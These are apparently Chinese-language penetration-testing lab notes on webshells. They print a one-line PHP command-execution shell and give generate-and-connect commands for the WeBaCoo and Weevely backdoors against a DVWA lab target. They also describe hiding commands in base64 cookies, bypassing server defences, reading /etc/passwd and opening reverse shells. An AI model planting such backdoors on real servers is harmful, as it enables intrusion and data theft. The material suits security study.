WebShell

  • 一句话
    • <?php echo shell_exec($_GET['cmd']);?>
  • 可能被IDS、AV、WAF、扫描器软件发现查杀
  • 大马
    • php、asp、jsp等功能特别多的webshell

WeBaCoo

  • Web Backdoor Cookie
  • 类终端的shell（只针对php）
  • 编码通信内容通过cookie头传输，隐蔽性较强
    • cm：base64编码的命令
    • cn：服务器用于返回数据的cookie头的名
    • cp：返回信息定界符
  • 生成服务端
    • webacoo -g -o a.php
  • 客户端连接
    • webacoo -t -u http://1.1.1.1/a.php

生成服务端

  • webacoo -g -o a.php

-g：表示生成服务器端

-o：生成的服务端要输出为一个文件

其中的后门程序都被加密，用于绕过服务器端的防护

上传a.php文件

在正常情况下webshell通过文件上传或通过漏洞写入web网站目录中

客户端连接

  • webacoo -t -u http://1.1.1.1/a.php

-t：远程终端连接

抓包分析

Cookie后面经过base64编码之后的发送的指令：cat /etc/passwd；cn表示返回信息使用的cookie名；cp：返回数据的起始定界符，服务端cookie中BLy~定界符，从此定界符开始往后都是返回的内容就是passwd文件中的数据

Weevely

  • 隐蔽的类终端PHP Webshell（只针对php）
  • 30多个管理模块
    • 执行系统命令、浏览文件系统
    • 检查服务器常见配置错误
    • 创建正向、反向TCP Shell连接
    • 通过目标计算机代理 HTTP 流量
    • 从目标计算机运行端口扫描，渗透内网
  • 支持连接密码

生成服务端

  • weevely generate pass123 wee.php

generate：生成后门文件，后面必须加上连接密码

pass123：连接密码

客户端连接

  • weevely http://192.168.216.167/dvwa/hackable/uploads/wee.php pass123

其中有些数据都是通过加密，最下面一行也是通过base64编码内容
